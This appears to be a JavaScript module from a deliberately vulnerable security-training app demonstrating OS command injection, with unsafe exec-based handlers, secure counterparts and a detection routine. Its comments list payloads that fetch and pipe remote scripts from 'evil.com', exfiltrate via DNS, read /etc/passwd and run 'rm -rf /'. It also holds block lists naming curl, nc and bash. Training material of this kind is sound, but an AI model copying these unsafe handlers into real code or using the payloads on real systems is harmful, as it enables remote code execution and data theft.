/**
 * ============================================================================
 * OS COMMAND INJECTION VULNERABILITY MODULE
 * ============================================================================
 * 
 * Enterprise-Grade Command Injection Demonstration Platform
 * Implements OS command execution vulnerabilities
 * 
 * @module vulnerabilities/injection/command
 * @category Security Training - OWASP A03:2021
 * @version 3.0.0
 * @license MIT
 * @author Security Research Team
 * 
 * ============================================================================
 * SECURITY WARNING:
 * ============================================================================
 * This module demonstrates OS Command Injection vulnerabilities:
 * - Direct command execution via exec/spawn
 * - Shell metacharacter exploitation
 * - Command chaining (;, &&, ||, |)
 * - Command substitution ($(), ``)
 * - Newline injection (\n)
 * - Remote Code Execution (RCE)
 * 
 * ⚠️  NEVER use these patterns in production code
 * ⚠️  FOR EDUCATIONAL AND TESTING PURPOSES ONLY
 * ⚠️  Can lead to complete system compromise
 * 
 * ============================================================================
 * ATTACK TYPES DEMONSTRATED:
 * ============================================================================
 * 1. Basic Command Injection (; ls)
 * 2. Command Chaining (&&, ||)
 * 3. Piped Commands (|)
 * 4. Command Substitution ($(cmd), `cmd`)
 * 5. File Operations (>, >>, <)
 * 6. Blind Command Injection
 * 7. Time-Based Detection
 * 8. Out-of-Band Data Exfiltration
 * 
 * ============================================================================
 * ATTACK VECTORS:
 * ============================================================================
 * - 127.0.0.1; cat /etc/passwd
 * - 127.0.0.1 && whoami
 * - 127.0.0.1 | ls -la
 * - $(cat /etc/passwd)
 * - `wget http://evil.com/shell.sh`
 * - 127.0.0.1%0Als
 * 
 * @requires child_process
 * @requires util
 */

import { exec, execSync, spawn } from 'child_process';
import { promisify } from 'util';
import { Database } from '../../core/Database.js';
import { Logger } from '../../core/Logger.js';
import { Cache } from '../../core/Cache.js';
import { Config } from '../../config/environment.js';
import { tables } from '../../config/database.js';
import { 
  HTTP_STATUS, 
  ATTACK_SEVERITY,
  ERROR_CODES 
} from '../../config/constants.js';
import { AppError } from '../../middleware/errorHandler.js';
import path from 'path';
import fs from 'fs/promises';

const execAsync = promisify(exec);
const db = Database.getInstance();
const logger = Logger.getInstance();
const cache = Cache.getInstance();

// ============================================================================
// COMMAND INJECTION CONSTANTS
// ============================================================================

const COMMAND_PATTERNS = {
  // Command separators
  SEPARATORS: [
    /;\s*[a-z]/i,
    /&&\s*[a-z]/i,
    /\|\|\s*[a-z]/i,
    /\|\s*[a-z]/i,
    /&\s*[a-z]/i
  ],
  
  // Command substitution
  SUBSTITUTION: [
    /\$\([^)]+\)/,
    /`[^`]+`/,
    /\$\{[^}]+\}/
  ],
  
  // File operations
  FILE_OPS: [
    />\s*[\/\w]/,
    />>\s*[\/\w]/,
    /<\s*[\/\w]/
  ],
  
  // Dangerous commands
  DANGEROUS_COMMANDS: [
    /\b(cat|less|more|head|tail)\b.*\/etc\/(passwd|shadow|hosts)/i,
    /\b(wget|curl|nc|netcat|bash|sh|python|perl|ruby)\b/i,
    /\b(rm|mv|cp|chmod|chown)\b.*-[rf]/i,
    /\b(kill|killall|pkill)\b/i,
    /\b(sudo|su)\b/i,
    /\b(eval|system|exec)\b/i
  ],
  
  // Newline injection
  NEWLINE: [
    /%0a/i,
    /%0d/i,
    /\\n/,
    /\\r/
  ]
};

const DANGEROUS_COMMANDS = [
  'rm', 'rmdir', 'del', 'format', 'dd',
  'kill', 'killall', 'pkill',
  'shutdown', 'reboot', 'halt',
  'iptables', 'netsh', 'route',
  'useradd', 'userdel', 'passwd',
  'chmod', 'chown', 'chgrp',
  'sudo', 'su', 'doas'
];

const SHELL_METACHARACTERS = [
  ';', '&', '|', '$', '`', '>', '<', 
  '(', ')', '{', '}', '[', ']', 
  '\n', '\r', '*', '?', '~', '!', '#'
];

// ============================================================================
// COMMAND INJECTION CLASS
// ============================================================================

export class CommandInjection {
  constructor() {
    this.name = 'OS Command Injection';
    this.category = 'Injection';
    this.cvssScore = 9.8;
    this.severity = ATTACK_SEVERITY.CRITICAL;
    this.owaspId = 'A03:2021';
    this.cweId = 'CWE-78';
    
    this.attackStats = {
      totalAttempts: 0,
      successfulInjections: 0,
      commandsExecuted: 0,
      filesAccessed: 0,
      systemCompromises: 0,
      blockedAttempts: 0
    };
  }

  // ==========================================================================
  // VULNERABLE IMPLEMENTATIONS
  // ==========================================================================

  /**
   * ⚠️ VULNERABLE: Ping Command - Direct Execution
   * 
   * Attack vectors:
   * - 127.0.0.1; ls -la
   * - 127.0.0.1 && cat /etc/passwd
   * - 127.0.0.1 | whoami
   * 
   * @param {string} host - Host to ping (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Command output
   */
  async vulnerablePing(host, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectCommandInjection(host);
      
      if (attackDetection.isAttack) {
        await this.logCommandAttack({
          type: 'COMMAND_INJECTION_PING',
          severity: attackDetection.severity,
          payload: { host },
          patterns: attackDetection.patterns,
          context
        });
      }

      // ⚠️ VULNERABLE: Direct command execution with user input
      const command = `ping -c 4 ${host}`;
      
      logger.warn('🚨 EXECUTING VULNERABLE COMMAND', {
        command,
        host,
        attackDetection
      });

      const { stdout, stderr } = await execAsync(command, {
        timeout: 10000,
        maxBuffer: 1024 * 1024
      });

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulInjections++;
        this.attackStats.commandsExecuted++;
      }

      return {
        success: true,
        vulnerable: true,
        output: stdout || stderr,
        command,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          severity: attackDetection.severity
        }
      };

    } catch (error) {
      return this.handleCommandError(error, host, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: DNS Lookup - Shell Injection
   * 
   * Attack vectors:
   * - google.com; cat /etc/passwd
   * - $(whoami).evil.com
   * - `id`.attacker.com
   * 
   * @param {string} domain - Domain to lookup (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} DNS results
   */
  async vulnerableDnsLookup(domain, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectCommandInjection(domain);
      
      if (attackDetection.isAttack) {
        await this.logCommandAttack({
          type: 'COMMAND_INJECTION_DNS',
          severity: attackDetection.severity,
          payload: { domain },
          patterns: attackDetection.patterns,
          context
        });
      }

      // ⚠️ VULNERABLE: nslookup with user input
      const command = `nslookup ${domain}`;
      
      logger.warn('🚨 VULNERABLE DNS LOOKUP', { command, domain, attackDetection });

      const { stdout, stderr } = await execAsync(command, {
        timeout: 5000,
        shell: '/bin/bash'
      });

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulInjections++;
        this.attackStats.commandsExecuted++;
      }

      return {
        success: true,
        vulnerable: true,
        output: stdout || stderr,
        command,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack
        }
      };

    } catch (error) {
      return this.handleCommandError(error, domain, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: File Download - wget/curl Injection
   * 
   * Attack vectors:
   * - http://example.com/file.txt; curl http://evil.com/shell.sh | bash
   * - http://example.com && wget http://attacker.com/backdoor
   * 
   * @param {string} url - URL to download (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Download result
   */
  async vulnerableDownloadFile(url, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectCommandInjection(url);
      
      if (attackDetection.isAttack) {
        await this.logCommandAttack({
          type: 'COMMAND_INJECTION_DOWNLOAD',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { url },
          patterns: attackDetection.patterns,
          context
        });

        this.attackStats.systemCompromises++;
      }

      // ⚠️ VULNERABLE: wget with user-controlled URL
      const outputPath = `/tmp/download_${Date.now()}.tmp`;
      const command = `wget -O ${outputPath} "${url}"`;
      
      logger.warn('🚨 VULNERABLE FILE DOWNLOAD', { command, url, attackDetection });

      const { stdout, stderr } = await execAsync(command, {
        timeout: 30000
      });

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulInjections++;
      }

      return {
        success: true,
        vulnerable: true,
        output: stdout || stderr,
        command,
        outputPath,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack,
          warning: '⚠️ Command injection can lead to RCE'
        }
      };

    } catch (error) {
      return this.handleCommandError(error, url, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Image Conversion - ImageMagick Injection
   * 
   * Attack vectors:
   * - image.jpg; ls -la > /tmp/output.txt
   * - image.jpg && cat /etc/passwd
   * 
   * @param {string} filename - File to convert (VULNERABLE)
   * @param {string} format - Output format (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Conversion result
   */
  async vulnerableImageConvert(filename, format = 'png', context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectCommandInjection(filename + format);
      
      if (attackDetection.isAttack) {
        await this.logCommandAttack({
          type: 'COMMAND_INJECTION_IMAGE',
          severity: attackDetection.severity,
          payload: { filename, format },
          patterns: attackDetection.patterns,
          context
        });

        this.attackStats.filesAccessed++;
      }

      // ⚠️ VULNERABLE: ImageMagick convert command
      const outputFile = `${filename}.${format}`;
      const command = `convert ${filename} ${outputFile}`;
      
      logger.warn('🚨 VULNERABLE IMAGE CONVERSION', { command, filename, format, attackDetection });

      const { stdout, stderr } = await execAsync(command, {
        timeout: 15000
      });

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulInjections++;
      }

      return {
        success: true,
        vulnerable: true,
        output: stdout || stderr,
        command,
        outputFile,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack
        }
      };

    } catch (error) {
      return this.handleCommandError(error, filename, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Blind Command Injection - Time-Based
   * 
   * Attack vectors:
   * - test; sleep 10
   * - test && ping -c 10 127.0.0.1
   * 
   * @param {string} input - User input (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Execution result
   */
  async vulnerableBlindCommand(input, context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectCommandInjection(input);
      
      if (attackDetection.isAttack) {
        await this.logCommandAttack({
          type: 'BLIND_COMMAND_INJECTION',
          severity: attackDetection.severity,
          payload: { input },
          patterns: attackDetection.patterns,
          context
        });
      }

      // ⚠️ VULNERABLE: Command executed but output not shown
      const command = `echo ${input} > /dev/null 2>&1`;
      
      logger.warn('🚨 BLIND COMMAND INJECTION', { command, input, attackDetection });

      execSync(command, { timeout: 15000 });

      const duration = Date.now() - startTime;

      // Detect time-based attacks
      const timeBasedAttack = duration > 5000;

      if (attackDetection.isAttack || timeBasedAttack) {
        this.attackStats.successfulInjections++;
      }

      return {
        success: true,
        vulnerable: true,
        message: 'Command executed (output hidden)',
        command,
        timing: {
          executionTime: duration,
          timeBasedAttack,
          significant: timeBasedAttack
        },
        metadata: {
          attackDetected: attackDetection.isAttack,
          blindInjection: true
        }
      };

    } catch (error) {
      return this.handleCommandError(error, input, Date.now() - startTime);
    }
  }

  /**
   * ⚠️ VULNERABLE: Archive Extraction - Tar Injection
   * 
   * Attack vectors:
   * - file.tar; rm -rf /
   * - --checkpoint=1 --checkpoint-action=exec=sh shell.sh
   * 
   * @param {string} archivePath - Archive to extract (VULNERABLE)
   * @param {string} destination - Extract destination (VULNERABLE)
   * @param {object} context - Request context
   * @returns {Promise<object>} Extraction result
   */
  async vulnerableExtractArchive(archivePath, destination = '/tmp', context = {}) {
    const startTime = Date.now();

    try {
      this.attackStats.totalAttempts++;

      const attackDetection = this.detectCommandInjection(archivePath + destination);
      
      if (attackDetection.isAttack) {
        await this.logCommandAttack({
          type: 'COMMAND_INJECTION_TAR',
          severity: ATTACK_SEVERITY.CRITICAL,
          payload: { archivePath, destination },
          patterns: attackDetection.patterns,
          context
        });
      }

      // ⚠️ VULNERABLE: tar command with user input
      const command = `tar -xzf ${archivePath} -C ${destination}`;
      
      logger.warn('🚨 VULNERABLE TAR EXTRACTION', { command, archivePath, destination, attackDetection });

      const { stdout, stderr } = await execAsync(command, {
        timeout: 30000
      });

      const duration = Date.now() - startTime;

      if (attackDetection.isAttack) {
        this.attackStats.successfulInjections++;
        this.attackStats.filesAccessed++;
      }

      return {
        success: true,
        vulnerable: true,
        output: stdout || stderr,
        command,
        destination,
        metadata: {
          executionTime: duration,
          attackDetected: attackDetection.isAttack
        }
      };

    } catch (error) {
      return this.handleCommandError(error, archivePath, Date.now() - startTime);
    }
  }

  // ==========================================================================
  // SECURE IMPLEMENTATIONS (REFERENCE)
  // ==========================================================================

  /**
   * ✅ SECURE: Safe Ping - Input Validation
   * 
   * @param {string} host - Host to ping (SAFE)
   * @returns {Promise<object>} Ping result
   */
  async securePing(host) {
    const startTime = Date.now();

    try {
      // ✅ Validate input - only allow IP addresses or valid domains
      const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;

      if (!ipRegex.test(host) && !domainRegex.test(host)) {
        throw new AppError('Invalid host format', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Use spawn with array arguments (no shell interpretation)
      const args = ['-c', '4', host];
      
      return new Promise((resolve, reject) => {
        const pingProcess = spawn('ping', args, {
          timeout: 10000
        });

        let stdout = '';
        let stderr = '';

        pingProcess.stdout.on('data', (data) => {
          stdout += data.toString();
        });

        pingProcess.stderr.on('data', (data) => {
          stderr += data.toString();
        });

        pingProcess.on('close', (code) => {
          const duration = Date.now() - startTime;

          resolve({
            success: code === 0,
            vulnerable: false,
            output: stdout || stderr,
            metadata: {
              executionTime: duration,
              method: 'SAFE_SPAWN_WITH_ARGS'
            }
          });
        });

        pingProcess.on('error', (error) => {
          reject(error);
        });
      });

    } catch (error) {
      logger.error('Secure ping error', { error: error.message });
      throw error;
    }
  }

  /**
   * ✅ SECURE: Safe DNS Lookup - Using Node.js DNS Module
   * 
   * @param {string} domain - Domain to lookup (SAFE)
   * @returns {Promise<object>} DNS result
   */
  async secureDnsLookup(domain) {
    const dns = await import('dns');
    const dnsPromises = dns.promises;
    const startTime = Date.now();

    try {
      // ✅ Validate domain format
      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
      
      if (!domainRegex.test(domain)) {
        throw new AppError('Invalid domain format', HTTP_STATUS.BAD_REQUEST);
      }

      // ✅ Use Node.js built-in DNS module (no shell)
      const addresses = await dnsPromises.resolve4(domain);
      const duration = Date.now() - startTime;

      return {
        success: true,
        vulnerable: false,
        addresses,
        metadata: {
          executionTime: duration,
          method: 'NODEJS_DNS_MODULE'
        }
      };

    } catch (error) {
      logger.error('Secure DNS lookup error', { error: error.message });
      throw error;
    }
  }

  // ==========================================================================
  // ATTACK DETECTION & LOGGING
  // ==========================================================================

  /**
   * Detect command injection patterns
   */
  detectCommandInjection(input) {
    const detectedPatterns = [];
    let severity = ATTACK_SEVERITY.MEDIUM;
    let score = 0;

    // Check for shell metacharacters
    const foundMetaChars = SHELL_METACHARACTERS.filter(char => input.includes(char));
    if (foundMetaChars.length > 0) {
      detectedPatterns.push({
        category: 'SHELL_METACHARACTERS',
        characters: foundMetaChars
      });
      score += foundMetaChars.length * 5;
    }

    // Check all command patterns
    for (const [category, patterns] of Object.entries(COMMAND_PATTERNS)) {
      for (const pattern of patterns) {
        if (pattern.test(input)) {
          detectedPatterns.push({
            category,
            pattern: pattern.toString(),
            matched: true
          });
          score += this.getPatternScore(category);

          if (category === 'DANGEROUS_COMMANDS') {
            severity = ATTACK_SEVERITY.CRITICAL;
          }
        }
      }
    }

    // Check for dangerous command names
    const foundDangerousCommands = DANGEROUS_COMMANDS.filter(cmd => 
      new RegExp(`\\b${cmd}\\b`, 'i').test(input)
    );

    if (foundDangerousCommands.length > 0) {
      detectedPatterns.push({
        category: 'DANGEROUS_COMMAND_NAMES',
        commands: foundDangerousCommands
      });
      score += foundDangerousCommands.length * 10;
      severity = ATTACK_SEVERITY.CRITICAL;
    }

    if (score >= 20) severity = ATTACK_SEVERITY.CRITICAL;
    else if (score >= 10) severity = ATTACK_SEVERITY.HIGH;
    else if (score >= 5) severity = ATTACK_SEVERITY.MEDIUM;

    const isAttack = detectedPatterns.length > 0;

    if (isAttack) {
      this.attackStats.blockedAttempts++;
    }

    return {
      isAttack,
      severity,
      score,
      patterns: detectedPatterns,
      input: input.substring(0, 200),
      timestamp: new Date().toISOString()
    };
  }

  /**
   * Log command injection attack
   */
  async logCommandAttack(attackData) {
    try {
      const {
        type,
        severity,
        payload,
        patterns,
        context,
        timestamp = new Date()
      } = attackData;

      await db.execute(
        `INSERT INTO ${tables.ATTACK_LOGS} (
          attack_type, severity, payload, patterns,
          ip_address, user_agent, user_id, endpoint,
          timestamp, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())`,
        [
          type,
          severity,
          JSON.stringify(payload),
          JSON.stringify(patterns),
          context.ip || null,
          context.userAgent || null,
          context.userId || null,
          context.endpoint || null,
          timestamp
        ]
      );

      logger.attack('Command Injection Attack Detected', {
        type,
        severity,
        payload,
        patterns: patterns.map(p => p.category),
        context
      });

    } catch (error) {
      logger.error('Failed to log command attack', { error: error.message });
    }
  }

  /**
   * Handle command errors
   */
  handleCommandError(error, input, duration) {
    logger.error('Command Injection Error', {
      message: error.message,
      code: error.code,
      input,
      duration
    });

    return {
      success: false,
      vulnerable: true,
      error: {
        message: error.message,
        code: error.code,
        signal: error.signal
      },
      metadata: {
        executionTime: duration,
        errorType: 'COMMAND_EXECUTION_ERROR'
      }
    };
  }

  /**
   * Get pattern severity score
   */
  getPatternScore(category) {
    const scores = {
      DANGEROUS_COMMANDS: 15,
      SUBSTITUTION: 12,
      SEPARATORS: 10,
      FILE_OPS: 8,
      NEWLINE: 5
    };
    return scores[category] || 1;
  }

  // ==========================================================================
  // UTILITY & REPORTING
  // ==========================================================================

  /**
   * Get attack statistics
   */
  getStatistics() {
    return {
      ...this.attackStats,
      successRate: this.attackStats.totalAttempts > 0
        ? ((this.attackStats.successfulInjections / this.attackStats.totalAttempts) * 100).toFixed(2) + '%'
        : '0%'
    };
  }

  /**
   * Get vulnerability information
   */
  getVulnerabilityInfo() {
    return {
      name: this.name,
      category: this.category,
      cvssScore: this.cvssScore,
      severity: this.severity,
      owaspId: this.owaspId,
      cweId: this.cweId,
      description: 'OS Command Injection allows attackers to execute arbitrary system commands on the server',
      impact: [
        'Complete system compromise',
        'Remote Code Execution (RCE)',
        'Data theft and exfiltration',
        'System file access',
        'Privilege escalation',
        'Denial of Service',
        'Backdoor installation',
        'Lateral movement in network'
      ],
      remediation: [
        'Never pass user input directly to system commands',
        'Use built-in libraries instead of shell commands',
        'Use spawn() with array arguments instead of exec()',
        'Implement strict input validation (whitelist)',
        'Run commands with minimal privileges',
        'Disable shell interpretation',
        'Use containerization/sandboxing',
        'Regular security audits'
      ]
    };
  }

  /**
   * Reset statistics
   */
  resetStatistics() {
    this.attackStats = {
      totalAttempts: 0,
      successfulInjections: 0,
      commandsExecuted: 0,
      filesAccessed: 0,
      systemCompromises: 0,
      blockedAttempts: 0
    };
  }
}

// ============================================================================
// FACTORY & EXPORT
// ============================================================================

let instance = null;

export const getCommandInjection = () => {
  if (!instance) {
    instance = new CommandInjection();
  }
  return instance;
};

export const createCommandHandler = (method) => {
  return async (req, res, next) => {
    try {
      const injection = getCommandInjection();
      
      if (Config.security.mode !== 'vulnerable') {
        return res.status(HTTP_STATUS.FORBIDDEN).json({
          success: false,
          error: ERROR_CODES.FORBIDDEN,
          message: 'This endpoint is only available in vulnerable mode'
        });
      }

      const context = {
        ip: req.ip,
        userAgent: req.get('user-agent'),
        userId: req.user?.id,
        endpoint: req.path
      };

      const result = await injection[method](...Object.values(req.body || req.query || req.params), context);
      
      res.json(result);

    } catch (error) {
      next(error);
    }
  };
};

export default {
  CommandInjection,
  getCommandInjection,
  createCommandHandler
};
